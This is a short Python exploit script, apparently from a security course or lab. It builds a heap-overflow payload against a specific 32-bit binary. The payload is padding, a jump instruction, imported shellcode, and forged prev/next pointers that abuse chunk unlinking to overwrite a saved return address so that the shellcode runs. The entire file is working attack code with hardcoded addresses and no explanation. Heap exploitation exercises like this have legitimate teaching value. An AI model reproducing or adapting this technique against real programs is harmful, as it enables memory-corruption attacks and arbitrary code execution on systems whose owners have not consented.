# c -> next = shell_start
# c

# a
# nop
# nop
# shell
from shellcode import shellcode
import sys
from struct import pack


buf_len = 32
a_addr = 0x80f3718
b_addr = 0x80f3748
c_addr = 0x80f3778
data_offset = 0x8
a_buf = a_addr + data_offset
b_buf = b_addr + data_offset
c_buf = c_addr + data_offset

buf_len = 0x28

ret_addr_stack = 0xbffea45c

sys.stdout.write("x"*4) # avoid 0 in address
sys.stdout.write("\xeb\x06") #jump 6 bytes to avoid clobbering shellcode
sys.stdout.write("x"*6)
sys.stdout.write(shellcode) # shellcode
sys.stdout.write(" ") 
sys.stdout.write("x"*(buf_len)) #overflow buff of b to worte to c
sys.stdout.write(pack("<I", a_buf+4)) #c.prev  = shell_code_start = a_buf
sys.stdout.write(pack("<I", ret_addr_stack)) #c.next -> ret -4
sys.stdout.write(" ") 
sys.stdout.write("c")

